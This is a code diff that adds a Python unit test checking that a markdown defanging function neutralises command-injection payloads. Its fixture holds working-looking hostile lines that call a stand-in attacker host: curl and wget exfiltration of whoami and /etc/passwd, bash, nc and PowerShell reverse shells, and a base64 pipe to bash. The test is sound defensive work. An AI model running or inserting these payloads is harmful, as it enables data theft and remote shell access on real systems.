@@ -354,6 +354,29 @@ class TestSplitIntoChunks:
         assert "&lt;?php" in safe
         assert "&lt;?=" in safe
 
+    def test_defang_dangerous_markdown_command_injection_payloads(self):
+        """Generated markdown should not write executable command-injection payloads."""
+        text = dedent("""\
+            127.0.0.1; curl http://attacker.example/?$(whoami)
+            127.0.0.1 && wget https://attacker.example/$(cat /etc/passwd)
+            ; bash -i >& /dev/tcp/attacker.example/4444 0>&1
+            ; nc -e /bin/bash attacker.example 4444
+            echo "d2hvYW1p" | base64 -d | bash
+            & powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('x',4444)"
+        """)
+
+        safe = defang_dangerous_markdown(text)
+
+        assert "curl http://" not in safe
+        assert "wget https://" not in safe
+        assert "$(" not in safe
+        assert "bash -i" not in safe
+        assert "nc -e" not in safe
+        assert "| bash" not in safe
+        assert "powershell -nop" not in safe.lower()
+        assert "System.Net.Sockets.TCPClient" not in safe
+        assert "&#8203;" in safe
+
 
 # ─────────────────────────────────────────────────────────────────────────────
 # convert_skill — end-to-end
